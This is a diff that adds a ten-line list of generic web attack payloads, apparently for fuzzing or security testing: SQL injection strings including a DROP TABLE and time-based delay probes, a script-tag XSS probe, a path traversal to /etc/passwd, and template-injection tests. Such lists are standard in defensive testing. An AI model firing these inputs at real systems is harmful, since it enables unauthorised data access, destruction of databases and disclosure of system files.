@@ -1,0 +1,10 @@
+' OR '1'='1
+" OR "1"="1
+1; DROP TABLE users--
+' UNION SELECT null--
+<script>alert(1)</script>
+../../../etc/passwd
+{{7*7}}
+${7*7}
+'; waitfor delay '0:0:5'--
+1 AND SLEEP(5)
